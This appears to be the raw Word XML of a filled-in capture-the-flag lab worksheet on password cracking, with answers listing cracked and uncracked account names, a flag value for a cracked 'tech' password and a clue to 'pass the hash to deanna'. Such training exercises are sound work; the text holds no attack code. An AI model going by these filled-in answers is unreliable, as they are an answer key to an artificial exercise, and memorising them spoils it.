    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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V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iew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he c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ck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wo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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:footerReference w:type="default" r:id="rId30"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:pgNumType w:start="15"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Which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nts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v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e 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swor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?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ec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m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ow:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="8800"/>
        </w:tabs>
        <w:spacing w:before="37"/>
        <w:ind w:left="252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808080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80808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80808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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cked</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="80808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80808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808080"/>
          <w:spacing w:val="-2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808080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808080"/>
          <w:spacing w:val="1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808080"/>
          <w:spacing w:val="-2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color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">nts: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EC6173">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>admin,moo,tech,clue,accounts_payable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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Which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nts re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in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u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ncra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k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?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="8800"/>
        </w:tabs>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1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color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ck</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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808080"/>
          <w:position w:val="-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808080"/>
          <w:spacing w:val="1"/>
          <w:position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808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">unts: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EC6173">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>Guest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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6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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Capture the </w:t>
      </w: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F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lag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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Loc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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position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 xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position w:val="-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 xml:space="preserve">lag in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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he c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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pacing w:val="1"/>
          <w:position w:val="-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2"/>
          <w:position w:val="-1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ked</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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1"/>
          <w:position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 xml:space="preserve">or in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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he p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-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ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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1"/>
          <w:position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1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> f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 xml:space="preserve">or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4"/>
          <w:position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 xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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-2"/>
          <w:position w:val="-1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-1"/>
          <w:position w:val="-1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'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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1"/>
          <w:position w:val="-1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2"/>
          <w:position w:val="-1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nt.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/>
        <w:ind w:left="252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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>FLA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>tech_password_cracked</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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7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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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R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 xml:space="preserve">ad </w:t>
      </w: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t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 xml:space="preserve">he Clue to </w:t>
      </w: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t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he N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2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>x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 xml:space="preserve">t </w:t>
      </w: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F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lag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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Look</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position w:val="-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or a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>fa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k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 xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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 xml:space="preserve">ser or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1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3"/>
          <w:position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e em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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1"/>
          <w:position w:val="-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-1"/>
          <w:position w:val="-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ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position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3"/>
          <w:position w:val="-1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n the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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-2"/>
          <w:position w:val="-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2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>he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1"/>
          <w:position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or c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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ents.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A86C10" w:rsidRDefault="007E35E5" w:rsidP="00A86C10">
      <w:pPr>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="2520"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1095" style="position:absolute;left:0;text-align:left;margin-left:125.5pt;margin-top:1.35pt;width:339pt;height:13.5pt;z-index:-1888;mso-position-horizontal-relative:page" coordorigin="2510,27" coordsize="6780,270">
            <v:shape id="_x0000_s1097" style="position:absolute;left:2520;top:37;width:6760;height:250" coordorigin="2520,37" coordsize="6760,250" path="m2520,287r6760,l9280,37r-6760,l2520,287xe" fillcolor="aqua" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1096" style="position:absolute;left:3121;top:261;width:6160;height:0" coordorigin="3121,261" coordsize="6160,0" path="m3121,261r6160,e" filled="f" strokecolor="gray" strokeweight=".26094mm">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>UE:</w:t>
      </w:r>
      <w:r w:rsidR="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pass the hash to deanna</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861" w:rsidP="00A86C10">
      <w:pPr>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="720" w:firstLine="720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8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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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>B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read</w:t>
      </w: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ru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>m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b</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="23"/>
        <w:ind w:left="1800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a. </w:t>
